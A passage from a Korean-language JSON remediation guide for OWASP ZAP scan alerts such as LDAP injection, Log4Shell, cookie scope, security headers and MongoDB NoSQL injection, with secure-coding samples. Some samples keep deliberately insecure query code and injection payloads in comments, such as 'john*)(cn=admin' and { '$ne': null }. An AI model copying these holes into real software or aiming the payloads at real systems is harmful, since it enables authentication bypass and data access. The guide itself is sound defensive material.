\t\t\tSystem.err.println(\"Deserialization blocked: \" + e.getMessage());\n \t\t}\n \t}\n}\n    "
  },
  "LDAP Injection": {
    "translated": "LDAP 인젝션 – 사용자 입력이 LDAP 쿼리에 삽입되어 LDAP 서버의 데이터베이스를 조작하거나 임의 명령을 실행하는 공격",
    "description": "사용자 입력값이 LDAP(Lightweight Directory Access Protocol) 쿼리에 적절히 검증되지 않고 삽입되어, 공격자가 LDAP 서버에 대해 임의의 쿼리를 실행하거나 데이터를 변경할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**입력값 이스케이프:** 사용자 입력값을 LDAP 쿼리에 삽입하기 전에 LDAP 특수 문자(예: `(`, `)`, `=`, `*`, `,`, `\\`, `/`, `+`, `#`, `<`, `>`, `;`, `\"`)를 적절히 이스케이프 처리합니다.",
      "**준비된 문(Prepared Statements) 또는 매개변수화된 쿼리 사용:** 가능하면 LDAP 쿼리를 위한 준비된 문이나 매개변수화된 API를 사용하여 입력값과 쿼리를 분리합니다.",
      "**입력값 유효성 검사:** 예상되는 형식과 패턴에 맞춰 사용자 입력값을 강력하게 검증합니다.",
      "**최소 권한 원칙:** LDAP 바인딩에 사용되는 계정에는 필요한 최소한의 권한만 부여합니다."
    ],
    "example_java_ldap": "\nimport javax.naming.Context;\nimport javax.naming.NamingEnumeration;\nimport javax.naming.directory.*;\nimport java.util.Hashtable;\n\npublic class LdapInjectionExample {\n\n \tpublic DirContext getLdapContext() throws Exception {\n \t\tHashtable<String, String> env = new Hashtable<>();\n \t\tenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n \t\tenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/dc=example,dc=com\");\n \t\tenv.put(Context.SECURITY_AUTHENTICATION, \"simple\");\n \t\tenv.put(Context.SECURITY_PRINCIPAL, \"cn=admin,dc=example,dc=com\");\n \t\tenv.put(Context.SECURITY_CREDENTIALS, \"adminpassword\");\n \t\treturn new InitialDirContext(env);\n \t}\n\n \t// Insecure - vulnerable to LDAP Injection\n \tpublic void searchUserInsecure(String username) {\n \t\ttry (DirContext ctx = getLdapContext()) {\n \t\t\tString filter = \"(&(objectClass=person)(cn=\" + username + \"))\";\n \t\t\tNamingEnumeration<SearchResult> results = ctx.search(\"ou=users\", filter, new SearchControls());\n \t\t\twhile (results.hasMore()) {\n \t\t\t\tSearchResult sr = results.next();\n \t\t\t\tSystem.out.println(sr.getNameInNamespace());\n \t\t\t}\n \t\t} catch (Exception e) {\n \t\t\te.printStackTrace();\n \t\t}\n \t}\n\n \t// Secure - using parameterized queries (or manual escaping if no direct parameterized API)\n \tpublic void searchUserSecure(String username) {\n \t\ttry (DirContext ctx = getLdapContext()) {\n \t\t\t// LDAP 특수 문자 이스케이프 (수동 구현이 필요할 수 있음)\n \t\t\t// 실제 구현에서는 더 견고한 이스케이프 라이브러리를 사용해야 합니다.\n \t\t\tString escapedUsername = username\n \t\t\t\t.replace(\"\\\\\", \"\\\\\")\n \t\t\t\t.replace(\"*\", \"\\*\")\n \t\t\t\t.replace(\"(\", \"\\(\")\n \t\t\t\t.replace(\")\", \"\\)\");\n\n \t\t\tString filter = \"(&(objectClass=person)(cn=\" + escapedUsername + \"))\"; // 더 견고한 방법 필요\n \t\t\t// 일부 LDAP 라이브러리는 자체적인 매개변수화 기능을 제공합니다.\n \t\t\t// Apache Directory API의 filter builder와 같은 도구를 사용하면 좋습니다.\n\n \t\t\tNamingEnumeration<SearchResult> results = ctx.search(\"ou=users\", filter, new SearchControls());\n \t\t\twhile (results.hasMore()) {\n \t\t\t\tSearchResult sr = results.next();\n \t\t\t\tSystem.out.println(sr.getNameInNamespace());\n \t\t\t}\n \t\t} catch (Exception e) {\n \t\t\te.printStackTrace();\n \t\t}\n \t}\n\n \tpublic static void main(String[] args) {\n \t\tLdapInjectionExample app = new LdapInjectionExample();\n\n \t\tSystem.out.println(\"--- Insecure Search (Vulnerable) ---\");\n \t\t// app.searchUserInsecure(\"john*)(cn=admin\"); // LDAP Injection payload\n\n \t\tSystem.out.println(\"\\n--- Secure Search ---\");\n \t\tapp.searchUserSecure(\"john\"); // Normal user\n \t\t// app.searchUserSecure(\"john*)(cn=admin\"); // Escaped payload (should not be injected)\n \t}\n}\n    "
  },
  "Log4Shell": {
    "translated": "Log4Shell – Apache Log4j 로깅 라이브러리의 심각한 원격 코드 실행 취약점",
    "description": "Apache Log4j 2의 JNDI Lookup 기능에서 발생하는 원격 코드 실행(RCE) 취약점입니다. (CVE-2021-44228, CVE-2021-45046 등)",
    "solution_guidelines": [
      "**Log4j 라이브러리 업데이트:** Log4j를 2.17.1 이상 버전으로 즉시 업데이트합니다. (2.17.0은 DoS 취약점이 있음)",
      "**JNDI Lookup 비활성화 (긴급 조치):** Log4j 2.10.0 ~ 2.14.1 버전에서는 시스템 속성 `log4j2.formatMsgNoLookups`를 `true`로 설정하거나, 환경 변수 `LOG4J_FORMAT_MSG_NO_LOOKUPS`를 `true`로 설정하여 JNDI Lookups 기능을 비활성화합니다.",
      "**네트워크 수준 차단:** 방화벽에서 LDAP, RMI 등 JNDI 공격에 사용될 수 있는 프로토콜에 대한 외부 연결을 차단합니다.",
      "**Outbound Connection 제한:** 서버에서 불필요한 외부 네트워크 연결을 제한합니다."
    ],
    "example_log4j_mitigation": "\n# log4j 2.10.0 ~ 2.14.1 버전에서의 임시 조치 (업데이트가 최우선)\n\n# 1. JVM 시작 옵션 추가 (가장 일반적인 방법)\njava -Dlog4j2.formatMsgNoLookups=true -jar your_application.jar\n\n# 2. 환경 변수 설정\nexport LOG4J_FORMAT_MSG_NO_LOOKUPS=true\njava -jar your_application.jar\n\n# 3. Log4j 설정 파일 (log4j2.xml 또는 log4j2.properties)\n# <Configuration status=\"WARN\" packages=\"org.apache.logging.log4j.core\">\n# \t<Properties>\n# \t\t<Property name=\"log4j2.formatMsgNoLookups\">true</Property>\n# \t</Properties>\n# \t...\n# </Configuration>\n\t\t"
  },
  "Log4Shell (CVE-2021-44228)": {
    "translated": "Log4Shell (CVE-2021-44228) – Apache Log4j 라이브러리의 원격 코드 실행 취약점 (첫 번째)",
    "description": "Log4j 2.x에서 발생하는 JNDI Lookup을 통한 원격 코드 실행(RCE) 취약점으로, Log4j 2.0-beta9부터 2.14.1 버전까지 영향을 미칩니다.",
    "solution_guidelines": [
      "**Log4j 2.17.1 이상으로 업데이트:** 가장 중요하고 확실한 해결책입니다. 이 버전에서는 JNDI Lookup 동작이 기본적으로 비활성화됩니다.",
      "**Log4j 2.10.0 ~ 2.14.1 버전의 긴급 조치:** 시스템 속성 `log4j2.formatMsgNoLookups`를 `true`로 설정하거나, 환경 변수 `LOG4J_FORMAT_MSG_NO_LOOKUPS`를 `true`로 설정하여 JNDI Lookups 기능을 비활성화합니다.",
      "**JNDI Lookup 클래스 제거:** Log4j 2.0-beta9부터 2.9.1 버전까지는 `JndiLookup` 클래스를 클래스패스에서 제거합니다 (권장되지 않음, 업데이트가 최우선)."
    ],
    "example_log4j_patch": "\n# Log4j 라이브러리 업데이트 (Maven 예시)\n<dependency>\n\t<groupId>org.apache.logging.log4j</groupId>\n\t<artifactId>log4j-core</artifactId>\n\t<version>2.17.1</version> </dependency>\n<dependency>\n\t<groupId>org.apache.logging.log4j</groupId>\n\t<artifactId>log4j-api</artifactId>\n\t<version>2.17.1</version> </dependency>\n\t\t"
  },
  "Log4Shell (CVE-2021-45046)": {
    "translated": "Log4Shell (CVE-2021-45046) – Apache Log4j 라이브러리의 원격 코드 실행 취약점 (패치 우회)",
    "description": "Log4Shell CVE-2021-44228의 패치가 불완전하여 발생한 DoS(Denial of Service) 취약점으로, Log4j 2.15.0 버전이 영향을 받습니다. 특정 비표준 설정에서 RCE로 이어질 수도 있습니다.",
    "solution_guidelines": [
      "**Log4j 2.17.1 이상으로 업데이트:** 이 취약점 또한 2.17.1 버전에서 해결됩니다. 이전 버전 사용 시 2.16.0으로 업데이트하거나 2.17.1 이상으로 업데이트하는 것이 가장 안전합니다.",
      "**Log4j 2.16.0 버전의 추가 조치 (DoS 방지):** 이 버전에서는 message lookups 기능을 완전히 비활성화했지만, 여전히 특정 패턴으로 인한 DoS 가능성이 있었습니다."
    ],
    "example_log4j_update": "\n# Log4j 라이브러리 업데이트 (Gradle 예시)\ndependencies {\n\timplementation 'org.apache.logging.log4j:log4j-core:2.17.1' // 최신 보안 버전으로 업데이트\n\timplementation 'org.apache.logging.log4j:log4j-api:2.17.1'\n}\n\t\t"
  },
  "Loosely Scoped Cookie": {
    "translated": "느슨하게 범위 지정된 쿠키 – 쿠키가 너무 넓은 범위(도메인/경로)에 설정되어 보안에 취약할 수 있음",
    "description": "쿠키의 `Domain` 속성이 너무 광범위하게 설정되어 있어, 하위 도메인이나 다른 애플리케이션에서 쿠키를 공유하여 세션 하이재킹 또는 정보 유출 위험이 있는 취약점입니다.",
    "solution_guidelines": [
      "**쿠키 `Domain` 속성 제한:** 쿠키는 필요한 가장 구체적인 도메인으로 제한합니다. 일반적으로 `Domain` 속성을 생략하면 현재 요청의 호스트명으로 자동 설정되어 가장 안전합니다. 특정 하위 도메인에만 필요하다면 해당 하위 도메인으로 명시적으로 설정합니다.",
      "**`Path` 속성 제한:** 쿠키가 필요한 특정 경로에만 `Path` 속성을 설정하여 불필요한 경로에서의 노출을 방지합니다.",
      "**`Secure` 및 `HttpOnly` 속성 사용:** 민감한 쿠키는 `Secure` 속성을 사용하여 HTTPS를 통해서만 전송되도록 하고, `HttpOnly` 속성을 사용하여 클라이언트 측 스크립트에서 접근할 수 없도록 합니다 (XSS 완화)."
    ],
    "example_cookie_settings": "\n# 웹 애플리케이션 프레임워크에서의 쿠키 설정 예시 (Node.js Express)\nconst express = require('express');\nconst app = express();\n\napp.get('/set-cookie', (req, res) => {\n\t// 안전한 쿠키 설정: domain을 명시하지 않으면 현재 호스트명으로 설정됨\n\tres.cookie('session_id', 'some_secret_session_id', {\n\t\thttpOnly: true,\n\t\tsecure: true, // HTTPS 환경에서만 전송\n\t\tsameSite: 'Lax', // CSRF 방지\n\t\tmaxAge: 3600000 // 1시간\n\t});\n\n\t// 특정 하위 도메인에만 필요한 경우 (권장하지 않음, 매우 신중하게 사용)\n\t// res.cookie('sub_domain_cookie', 'data', {\n\t// \t\tdomain: '.example.com', // '.example.com'은 모든 하위 도메인에서 접근 가능\n\t// \t\thttpOnly: true,\n\t// \t\tsecure: true\n\t// });\n\n\tres.send('Cookie set!');\n});\n\n# PHP에서의 쿠키 설정 예시\n<?php\n// 안전한 쿠키 설정\nsetcookie(\"session_id\", \"some_secret_session_id\", [\n\t'expires' => time() + 3600,\n\t'path' => '/',\n\t'domain' => '', // 도메인을 명시하지 않으면 현재 호스트명으로 설정됨 (가장 안전)\n\t'secure' => true, // HTTPS를 통해서만 전송\n\t'httponly' => true, // JavaScript 접근 방지\n\t'samesite' => 'Lax' // CSRF 방지\n]);\n\n// 특정 하위 도메인에 필요한 경우 (매우 신중하게 사용)\n// setcookie(\"sub_domain_cookie\", \"data\", [\n// \t'expires' => time() + 3600,\n// \t'path' => '/',\n// \t'domain' => '.yourdomain.com', // .yourdomain.com 과 하위 도메인 모두\n// \t'secure' => true,\n// \t'httponly' => true,\n// \t'samesite' => 'Lax'\n// ]);\n?>\n\t\t"
  },
  "Missing Anti-clickjacking Header": {
    "translated": "클릭재킹 방지 헤더 누락 – X-Frame-Options 또는 Content-Security-Policy 헤더가 없어 클릭재킹 공격에 취약함",
    "description": "클릭재킹(Clickjacking) 공격을 방지하기 위한 `X-Frame-Options` 또는 `Content-Security-Policy: frame-ancestors` 헤더가 응답에 누락되어 있습니다.",
    "solution_guidelines": [
      "**`X-Frame-Options` 헤더 사용:** `X-Frame-Options` 헤더를 `DENY` 또는 `SAMEORIGIN`으로 설정하여 웹 페이지가 `<iframe>`, `<frame>`, `<object>` 태그 내에서 로드되는 것을 방지합니다.",
      "**`Content-Security-Policy`의 `frame-ancestors` 지시어 사용:** `Content-Security-Policy` (CSP) 헤더의 `frame-ancestors` 지시어를 사용하여 페이지를 프레임할 수 있는 출처를 세밀하게 제어합니다. `X-Frame-Options`보다 더 유연하고 강력합니다.",
      "**둘 중 하나만 사용:** `X-Frame-Options`와 `Content-Security-Policy: frame-ancestors`를 동시에 사용하면 `CSP`가 우선시되므로, 일반적으로 `CSP`를 사용하는 것이 좋습니다."
    ],
    "example_headers": "\n# 웹 서버 설정 (Nginx 예시)\n# X-Frame-Options (모든 도메인에서 프레이밍 금지)\nadd_header X-Frame-Options \"DENY\";\n\n# X-Frame-Options (동일 출처에서만 프레이밍 허용)\n# add_header X-Frame-Options \"SAMEORIGIN\";\n\n# Content-Security-Policy (CSP) with frame-ancestors (더 유연하고 강력)\n# 모든 프레이밍 금지\nadd_header Content-Security-Policy \"frame-ancestors 'none';\";\n# 동일 출처에서만 프레이밍 허용\n# add_header Content-Security-Policy \"frame-ancestors 'self';\";\n# 특정 도메인에서만 프레이밍 허용\n# add_header Content-Security-Policy \"frame-ancestors 'self' https://trusted.example.com;\";\n\n# Apache httpd.conf 또는 .htaccess 예시\n# Header set X-Frame-Options \"DENY\"\n# Header always append Content-Security-Policy \"frame-ancestors 'none';\"\n\t\t"
  },
  "Missing Security Headers": {
    "translated": "누락된 보안 헤더 – X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security 등 필수 보안 헤더가 누락됨",
    "description": "웹 애플리케이션의 응답에 중요한 보안 헤더(예: `Content-Security-Policy`, `X-Content-Type-Options`, `Strict-Transport-Security` 등)가 누락되어 다양한 클라이언트 측 공격에 취약할 수 있습니다.",
    "solution_guidelines": [
      "**`Content-Security-Policy` (CSP):** XSS, 데이터 주입 공격을 완화하기 위해 스크립트, 스타일, 이미지 등 로드 가능한 리소스의 출처를 제어합니다.",
      "**`X-Content-Type-Options: nosniff`:** 브라우저의 MIME 타입 스니핑을 방지하여 악의적인 파일이 잘못된 MIME 타입으로 실행되는 것을 막습니다.",
      "**`X-Frame-Options`:** 클릭재킹 공격을 방지하기 위해 페이지의 프레이밍을 제어합니다. (CSP의 `frame-ancestors`로 대체 가능)",
      "**`Strict-Transport-Security` (HSTS):** 클라이언트가 HTTPS를 통해서만 웹사이트에 접속하도록 강제하여 MITM(Man-in-the-Middle) 공격을 방지합니다.",
      "**`Referrer-Policy`:** 리퍼러(Referrer) 정보가 얼마나 상세하게 전송될지 제어하여 민감 정보 노출을 방지합니다.",
      "**`Permissions-Policy` (구 `Feature-Policy`):** 브라우저의 특정 기능(예: 카메라, 마이크)에 대한 접근 권한을 제어하여 보안을 강화합니다.",
      "**`X-XSS-Protection: 1; mode=block` (최신 브라우저에서는 CSP 사용 권장):** 구형 브라우저의 XSS 필터를 활성화합니다. CSP가 더 강력합니다."
    ],
    "example_all_headers": "\n# 웹 서버 설정 (Nginx 예시)\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com; object-src 'none'; base-uri 'self'; frame-ancestors 'self';\";\nadd_header X-Content-Type-Options \"nosniff\";\nadd_header X-Frame-Options \"DENY\";\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\";\nadd_header Referrer-Policy \"no-referrer-when-downgrade\";\nadd_header Permissions-Policy \"geolocation=(), microphone=()\"; # 필요에 따라 설정\n\n# Apache httpd.conf 또는 .htaccess 예시\n# Header always set Content-Security-Policy \"default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com; object-src 'none'; base-uri 'self'; frame-ancestors 'self;\"\n# Header always set X-Content-Type-Options \"nosniff\"\n# Header always set X-Frame-Options \"DENY\"\n# Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n# Header always set Referrer-Policy \"no-referrer-when-downgrade\"\n# Header always set Permissions-Policy \"geolocation=(), microphone=()\"\n\t\t"
  },
  "Modern Web Application": {
    "translated": "최신 웹 애플리케이션 – 최신 웹 기술 스택을 사용하는 애플리케이션으로 식별됨",
    "description": "이것은 특정 취약점이 아니라 ZAP이 웹 애플리케이션이 최신 기술(예: SPA, API)을 사용하는 것으로 식별했음을 나타냅니다. 이는 기존 취약점뿐만 아니라 API 보안, 클라이언트 측 로직 보안 등 새로운 유형의 보안 고려 사항이 필요함을 의미합니다.",
    "solution_guidelines": [
      "**API 보안 강화:** REST/GraphQL API에 대한 인증(JWT, OAuth), 권한 부여, 속도 제한, 로깅 및 모니터링을 철저히 합니다.",
      "**클라이언트 측 보안:** XSS(Cross-Site Scripting) 방지를 위한 출력 인코딩, CSRF(Cross-Site Request Forgery) 토큰 사용, 안전한 로컬 스토리지 사용 등을 강화합니다.",
      "**의존성 관리:** npm, Maven 등 패키지 관리자를 통해 사용되는 모든 라이브러리의 보안 취약점을 주기적으로 확인하고 업데이트합니다.",
      "**코드 스캔 및 분석:** 정적/동적 애플리케이션 보안 테스트(SAST/DAST) 도구를 사용하여 코드와 실행 환경의 취약점을 지속적으로 식별합니다.",
      "**보안 헤더 설정:** 위에서 설명된 다양한 보안 헤더(`CSP`, `HSTS`, `X-Content-Type-Options` 등)를 올바르게 설정합니다.",
      "**CSP(Content Security Policy) 세밀하게 조정:** SPA와 같이 동적으로 콘텐츠가 로드되는 애플리케이션의 특성을 고려하여, 필요한 출처만 허용하고 'unsafe-inline', 'unsafe-eval' 사용을 최소화하는 강력한 CSP를 구성합니다."
    ],
    "example_general": "\n# Modern Web Application 개발 가이드라인:\n# 1. API Gateway를 통한 보안 강화 (인증, 권한, 속도 제한)\n# 2. GraphQL 사용 시 쿼리 복잡도 제한 및 인스펙션 비활성화 (프로덕션 환경)\n# 3. 클라이언트 측에서 민감한 비즈니스 로직 처리 지양\n# 4. 프레임워크 제공 보안 기능 적극 활용 (예: Spring Security, Express Helmet)\n# 5. 빌드 파이프라인에 보안 테스트 자동화 (SAST, DAST, SCA)\n# 6. OAuth 2.0 및 OpenID Connect를 통한 안전한 인증/인가 구현\n\t\t"
  },
  "Multiple HREFs Redirect Detected (Potential Sensitive Information Leak)": {
    "translated": "다중 HREFs 리다이렉션 감지 (잠재적 민감 정보 유출) – 여러 리다이렉션 과정에서 URL에 민감 정보가 포함될 수 있음",
    "description": "하나의 응답 내에서 여러 개의 `refresh` 메타 태그 또는 HTTP `Location` 헤더를 통해 여러 번의 리다이렉션이 발생할 경우, 중간 리다이렉션에서 민감한 정보가 URL에 노출되거나 불필요하게 로깅될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**단일 리다이렉션 사용:** 불필요한 다중 리다이렉션을 제거하고, 최종 목적지로 직접 리다이렉트되도록 합니다.",
      "**URL에 민감 정보 포함 금지:** 리다이렉트되는 URL에 세션 ID, 개인 식별 정보(PII), 비밀번호 등 민감한 정보를 절대 포함하지 않습니다.",
      "**HTTP POST 사용:** 민감한 정보는 URL(GET 요청) 대신 HTTP POST 요청의 본문으로 전송합니다.",
      "**HTTPS 강제:** 모든 통신에 HTTPS를 사용하여 전송 중인 데이터가 암호화되도록 합니다."
    ],
    "example_redirect_fix": "\n# 안전한 리다이렉션 (서버 측)\n# PHP 예시\n<?php\n// 민감 정보 노출 없이 한 번에 리다이렉트\nheader(\"Location: https://example.com/secure_page\");\nexit();\n?>\n\n# Node.js Express 예시\napp.get('/old-path', (req, res) => {\n\tres.redirect(302, 'https://example.com/new-secure-path');\n});\n\n# JavaScript (클라이언트 측에서 불필요한 메타 리프레시 방지)\n// JavaScript를 통한 리다이렉트 시에도 민감 정보 주의\n// window.location.href = \"https://example.com/secure_page\";\n\t\t"
  },
  "Multiple X-Frame-Options Header Entries": {
    "translated": "다중 X-Frame-Options 헤더 항목 – X-Frame-Options 헤더가 여러 번 설정되어 브라우저별로 다르게 해석될 수 있음",
    "description": "응답 헤더에 `X-Frame-Options`가 여러 번 포함되어 있어 브라우저마다 다르게 해석되거나 무시될 수 있으며, 이는 클릭재킹 방어 메커니즘의 오작동을 유발할 수 있습니다.",
    "solution_guidelines": [
      "**단일 `X-Frame-Options` 헤더 사용:** 웹 서버 설정 또는 애플리케이션 코드에서 `X-Frame-Options` 헤더가 한 번만 응답에 포함되도록 합니다.",
      "**`X-Frame-Options` 대신 CSP `frame-ancestors` 사용 권장:** `Content-Security-Policy` 헤더의 `frame-ancestors` 지시어는 `X-Frame-Options`보다 더 유연하고 강력하며, 현대적인 브라우저에서 잘 지원됩니다. 둘 중 하나만 사용하여 중복을 피합니다."
    ],
    "example_fix_xframe": "\n# 웹 서버 설정 (Nginx 예시)\n# 이전에 다른 곳에서 add_header X-Frame-Options 설정이 있는지 확인하고 중복 제거\n# 그리고 단 하나의 명확한 설정만 남깁니다.\nadd_header X-Frame-Options \"DENY\"; # 또는 \"SAMEORIGIN\"\n\n# Apache httpd.conf 또는 .htaccess 예시\n# 모든 X-Frame-Options 헤더를 제거하고, 필요한 경우 하나만 추가\n# Header unset X-Frame-Options\n# Header always set X-Frame-Options \"DENY\"\n\n# Spring Security (Java) 예시 - 중복 방지\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\t@Override\n\tprotected void configure(HttpSecurity http) throws Exception {\n\t\thttp\n\t\t\t// .headers().frameOptions().deny() // 이 방법은 X-Frame-Options를 추가합니다.\n\t\t\t// .and()\n\t\t\t.headers()\n\t\t\t\t.contentSecurityPolicy(\"frame-ancestors 'none'\") // CSP를 통해 클릭재킹 방지\n\t\t\t\t.and()\n\t\t\t// ... 다른 보안 설정\n\t\t;\n\t}\n}\n\t\t"
  },
  "NoSQL Injection - MongoDB": {
    "translated": "NoSQL 인젝션 - MongoDB – MongoDB와 같은 NoSQL 데이터베이스에서 데이터 조작 또는 우회 공격",
    "description": "MongoDB와 같은 NoSQL 데이터베이스에서 사용자 입력값이 쿼리에 적절히 검증되지 않고 삽입되어, 공격자가 임의의 쿼리를 실행하거나 데이터에 무단 접근할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**입력값 유효성 검사 및 살균(Sanitization):** 모든 사용자 입력에 대해 강력한 유효성 검사를 수행하고, NoSQL 쿼리에 사용되기 전에 잠재적으로 위험한 문자(예: `$` 연산자, `.` 점, `;` 세미콜론)를 제거하거나 이스케이프 처리합니다.",
      "**매개변수화된 쿼리 또는 드라이버 API 사용:** NoSQL 데이터베이스 드라이버가 제공하는 안전한 API를 사용하여 쿼리를 구성합니다. 사용자 입력값을 직접 문자열 연결하여 쿼리를 만들지 않습니다.",
      "**최소 권한 원칙:** 데이터베이스 연결에 사용되는 계정에는 필요한 최소한의 권한만 부여합니다.",
      "**클라이언트 측 유효성 검사만 의존하지 않기:** 항상 서버 측에서 입력값을 다시 검증합니다."
    ],
    "example_nodejs_mongodb": "\nconst { MongoClient } = require('mongodb');\n\nasync function getUserData(username, password) {\n\tconst uri = \"mongodb://localhost:27017\";\n\tconst client = new MongoClient(uri);\n\n\ttry {\n\t\tawait client.connect();\n\t\tconst database = client.db('mydb');\n\t\tconst users = database.collection('users');\n\n\t\t// Insecure: Direct use of user input (vulnerable to operator injection)\n\t\t// const user = await users.findOne({ username: username, password: password });\n\t\t// console.log(\"Insecure Result:\", user);\n\n\t\t// Secure: Use driver's safe API, avoid direct object construction from user input if possible\n\t\t// If username/password are simple strings, direct use is often safe IF they are strings.\n\t\t// The danger comes when input can be interpreted as an operator (e.g., username: { \"$ne\": null })\n\t\t// Always ensure input is explicitly treated as a string/value, not an operator.\n\t\t// For dynamic queries, validate input against expected types and values.\n\n\t\t// Example for finding a user securely (assuming username and password are always strings)\n\t\t// If there's any chance 'username' could be a JSON object like { \"$ne\": null },\n\t\t// then additional sanitization or schema validation is critical.\n\t\tconst query = {\n\t\t\tusername: String(username), // Ensure it's treated as a string\n\t\t\tpassword: String(password)\n\t\t};\n\t\tconst user = await users.findOne(query);\n\t\tconsole.log(\"Secure Result:\", user);\n\n\t\t// More complex scenario: if you need to allow dynamic queries but limit operators\n\t\t// This requires a robust validation/sanitization layer\n\t\t// function validateAndSanitizeQuery(input) {\n\t\t// \t\t// Implement logic to deny '$' operators or specific dangerous keys/values\n\t\t// \t\t// e.g., if input contains keys like '$eq', '$ne', etc., filter or reject unless explicitly allowed.\n\t\t// \t\treturn input;\n\t\t// }\n\t\t// const safeQuery = validateAndSanitizeQuery(req.body.query);\n\t\t// const result = await users.find(safeQuery).toArray();\n\n\t} finally {\n\t\tawait client.close();\n\t}\n}\n\n// Example usage:\n// getUserData(\"testuser\", \"password123\");\n// Potentially insecure payload if not sanitized:\n// getUserData('testuser', { '$ne': null }); // Could bypass password check if not cast to string\n\t\t"
  },
  "NoSQL Injection - MongoDB (Time Based)": {
    "translated": "NoSQL 인젝션 - MongoDB (시간 기반) – MongoDB에서 응답 시간을 이용해 정보를 유추하는 인젝션 공격",
    "description": "MongoDB NoSQL 인젝션의 한 형태로, 불리언 기반(Boolean-based) 인젝션과 유사하게 쿼리 결과에 따라 응답 시간을 조작하여 데이터를 유추하는 공격 기법입니다.",
    "solution_guidelines": [
      "**일반 NoSQL Injection 방어 기법과 동일:** `NoSQL Injection - MongoDB` 취약점과 동일하게 입력값 유효성 검사 및 살균, 매개변수화된 쿼리 또는 드라이버 API 사용을 철저히 합니다.",
      "**오류 메시지 일반화:** 자세한 오류 메시지가 공격자에게 힌트를 주지 않도록 일반적인 오류 메시지를 반환합니다.",
      "**응답 시간 분석 방지:** 민감한 쿼리에 대해 응답 시간 변화가 데이터 유출로 이어지지 않도록 쿼리 로직을 최적화하고, 불필요한 시간 지연 함수 사용을 피합니다."
    ],
    "example_general": "\n# NoSQL Injection - MongoDB (Time Based) 방어 가이드라인:\n# 1. 모든 사용자 입력에 대해 강력한 유효성 검사를 수행하여 예상된 형식과 값만 허용합니다.\n# 2. MongoDB 드라이버의 안전한 API를 사용하여 쿼리를 구성하고, 절대로 사용자 입력을 직접 쿼리 문자열에 연결하지 않습니다.\n# 3. $where, $accumulator, $function과 같이 JavaScript를 실행할 수 있는 연산자의 사용을 극도로 제한하거나 금지합니다.\n# 4. 데이터베이스 오류 메시지를 일반화하여 공격자에게 정보를 노출하지 않도록 합니다.\n# 5. 잠재적으로 인젝션이 발생할 수 있는 쿼리에서 응답 시간을 분석하여 데이터를 유추하는 공격을 방지하기 위해 쿼리 최적화 및 로깅/모니터링을 강화합니다.\n\t\t"
  },
  "Non Static Site Detected": {
    "translated": "비정적 사이트 감지 – 동적으로 콘텐츠를 생성하는 웹 사이트가 감지됨",
    "description": "웹사이트가 정적이지 않고 동적 콘텐츠를 포함하고 있음을 나타냅니다. 이는 특정 취약점이라기보다는 서버 측 스크립트 실행, 데이터베이스 연동 등 동적 요소가 존재하므로 이에 따른 보안 취약점(예: SQL Injection, XSS, RCE 등)에 대한 추가적인 검토가 필요하다는 의미입니다.",
    "solution_guidelines": [
      "**모든 동적 입력 검증:** 사용자 입력이 포함되는 모든 동적 콘텐츠 생성 부분(게시판, 댓글, 검색 등)에서 XSS, SQL Injection 등 다양한 웹 취약점 방어를 위한 강력한 입력값 유효성 검사 및 출력 인코딩을 수행합니다.",
      "**서버 측 로직 보안:** 인증/인가 로직, 데이터베이스 쿼리, 파일 업로드/다운로드 등 서버 측에서 처리되는 모든 기능에 대해 보안 취약점이 없는지 철저히 검토합니다.",
      "**세션 관리 보안:** 안전한 세션 ID 생성, 세션 고정 방지, 적절한 세션 타임아웃 설정 등 세션 관리 보안을 강화합니다.",
      "**오류 처리:** 상세한 오류 메시지가 외부에 노출되지 않도록 일반적인 오류 페이지만 제공합니다.",
      "**정기적인 보안 감사:** 동적 웹 애플리케이션에 특화된 정적/동적 분석 도구를 사용하여 주기적으로 보안 감사를 수행합니다."
    ],
    "example_general": "\n# 동적 웹 애플리케이션 보안 개발 가이드라인:\n# 1. OWASP Top 10을 포함한 주요 웹 취약점 방어 기법을 숙지하고 적용합니다.\n# 2. 안전한 코딩 표준(Secure Coding Guidelines)을 따릅니다.\n# 3. 웹 애플리케이션 방화벽(WAF)을 도입하여 알려진 공격 패턴을 차단합니다.\n# 4. 프레임워크의 보안 기능을 적극적으로 활용하고 최신 버전으로 유지합니다.\n# 5. 로그를 통해 비정상적인 접근이나 공격 시도를 모니터링합니다.\n\t\t"
  },
  "Non-Storable Content": {
    "translated": "비저장 가능 콘텐츠 – 특정 콘텐츠가 캐시나 저장소에 저장될 수 없는 것으로 확인됨",
    "description": "캐시될 수 없는 콘텐츠가 캐시 관련 헤더 없이 제공되거나, 민감한 정보가 포함된 콘텐츠가 부적절하게 캐시될 위험이 있음을 나타냅니다. 이는 정보 유출로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**적절한 Cache-Control 헤더 사용:** 민감한 정보가 포함된 페이지나 사용자별로 달라지는 페이지에는 `Cache-Control: no-store` 또는 `Cache-Control: no-cache, private`와 같은 헤더를 명시적으로 설정하여 캐싱을 방지합니다.",
      "**`Vary` 헤더 사용:** 사용자 에이전트, Accept-Encoding 등 요청 헤더에 따라 응답이 달라지는 경우 `Vary` 헤더를 사용하여 프록시 캐시가 올바른 버전을 제공하도록 합니다.",
      "**`Expires` 및 `Pragma` 헤더 설정:** HTTP 1.0 호환성을 위해 `Expires: 0` 또는 `Pragma: no-cache`를 함께 사용할 수 있습니다 (Cache-Control이 우선시됨).",
      "**HTTPS 강제:** 모든 민감한 정보는 HTTPS를 통해 전송되도록 합니다."
    ],
